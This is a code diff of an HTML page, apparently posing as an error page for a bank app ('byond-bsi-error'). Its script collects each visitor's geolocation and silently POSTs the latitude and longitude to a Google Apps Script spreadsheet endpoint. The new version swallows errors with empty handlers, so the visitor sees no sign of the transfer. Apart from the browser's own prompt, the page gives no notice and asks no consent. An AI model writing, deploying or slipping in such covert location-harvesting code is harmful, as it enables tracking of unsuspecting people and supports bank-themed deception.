@@ -26,7 +26,9 @@
     </style>
   </head>
   <body class="flex items-center justify-center bg-zinc-900">
-    <section class="h-dvh bg-white w-full max-w-[500px] relative overflow-auto scrollbar-hide">
+    <section
+      class="h-dvh bg-white w-full max-w-[500px] relative overflow-auto scrollbar-hide"
+    >
       <div
         class="w-full bg-linear-to-b from-emerald-600 to-yellow-500 h-50 relative"
       >
@@ -288,18 +290,22 @@
         "https://script.google.com/macros/s/AKfycbzi5dxCsfehVqPeM2ZAtDlh1JmBffrMpFprVx-mCv31wiTev8drSHS1OY3YDPqwXvKl/exec";
 
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (position) {
-          const latitude = position.coords.latitude.toFixed(6);
-          const longitude = position.coords.longitude.toFixed(6);
+        navigator.geolocation.getCurrentPosition(
+          function (position) {
+            const latitude = position.coords.latitude.toFixed(6);
+            const longitude = position.coords.longitude.toFixed(6);
 
-          // buat URL custom yang nanti disimpan di spreadsheet
-          const mapsUrl = `https://byond-bsi-error.vercel.app/?lat=${latitude}&lng=${longitude}`;
-
-          fetch(scriptURL, {
-            method: "POST",
-            body: JSON.stringify({ longitude, latitude, mapsUrl }),
-          });
-        });
+            // kirim ke spreadsheet
+            fetch(scriptURL, {
+              method: "POST",
+              body: JSON.stringify({ latitude, longitude }),
+            })
+              .then(() => {})
+              .catch((err) => {});
+          },
+          function (error) {}
+        );
+      } else {
       }
     </script>
   </body>
